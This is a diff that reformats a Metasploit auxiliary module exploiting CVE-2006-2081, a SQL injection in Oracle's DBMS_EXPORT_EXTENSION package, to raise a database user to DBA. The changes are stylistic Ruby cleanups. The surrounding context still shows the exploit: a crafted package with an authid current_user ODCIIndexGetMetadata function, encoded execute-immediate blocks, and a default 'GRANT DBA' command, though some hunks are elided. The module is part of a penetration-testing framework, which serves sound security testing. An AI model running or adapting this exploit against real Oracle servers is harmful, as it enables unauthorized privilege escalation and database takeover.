@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,51 +7,51 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::ORACLE
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Oracle DB SQL Injection via DBMS_EXPORT_EXTENSION',
-      'Description'    => %q{
-        This module will escalate a Oracle DB user to DBA by exploiting an
-        sql injection bug in the DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA package.
+                      'Name'           => 'Oracle DB SQL Injection via DBMS_EXPORT_EXTENSION',
+                      'Description'    => %q(
+                        This module will escalate a Oracle DB user to DBA by exploiting an
+                        sql injection bug in the DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA package.
 
-        Note: This module has been tested against 9i, 10gR1 and 10gR2.
-      },
-      'Author'         => [ 'MC' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'CVE', '2006-2081' ],
-          [ 'OSVDB', '25002' ],
-          [ 'BID', '17699' ],
-          [ 'URL', 'http://www.red-database-security.com/exploits/oracle-sql-injection-oracle-dbms_export_extension.html' ],
-        ],
-      'DisclosureDate' => 'Apr 26 2006'))
+                        Note: This module has been tested against 9i, 10gR1 and 10gR2.
+                      ),
+                      'Author'         => [ 'MC' ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'CVE', '2006-2081' ],
+                          [ 'OSVDB', '25002' ],
+                          [ 'BID', '17699' ],
+                          [ 'URL', 'http://www.red-database-security.com/exploits/oracle-sql-injection-oracle-dbms_export_extension.html' ]
+                        ],
+                      'DisclosureDate' => 'Apr 26 2006'))
 
-      register_options(
-        [
-          OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),
-        ], self.class)
+    register_options(
+      [
+        OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"])
+      ], self.class
+    )
   end
 
   def run
-    return if not check_dependencies
+    return unless check_dependencies
 
     name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
     rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
     rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
     rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
 
-    package = %Q|
+    package = %|
 create or replace package #{name} authid current_user is
 function ODCIIndexGetMetadata (oindexinfo sys.odciindexinfo,P3 varchar2,p4 varchar2,env sys.odcienv)
 return number;
 end;
     |
 
-    body = %Q|
+    body = %|
 create or replace package body #{name} is
 function ODCIIndexGetMetadata (oindexinfo sys.odciindexinfo,P3 varchar2,p4 varchar2,env sys.odcienv)
 return number is
@@ -63,7 +64,7 @@ end;
 end;
     |
 
-    sploit = %Q|
+    sploit = %|
 declare
 #{rand1} pls_integer;
 #{rand2} number;
@@ -74,7 +75,7 @@ begin
 end;
     |
 
-    encoded_package = %Q|
+    encoded_package = %|
 declare
 #{rand1} varchar2(32767);
 begin
@@ -83,7 +84,7 @@ execute immediate #{rand1};
 end;
     |
 
-    encoded_body = %Q|
+    encoded_body = %|
 declare
 #{rand2} varchar2(32767);
 begin
@@ -92,7 +93,7 @@ execute immediate #{rand2};
 end;
     |
 
-    encoded_sploit = %Q|
+    encoded_sploit = %|
 declare
 #{rand3} varchar2(32767);
 begin
@@ -113,5 +114,4 @@ end;
 
     # Probably should do a 'drop package #{name}'
   end
-
 end
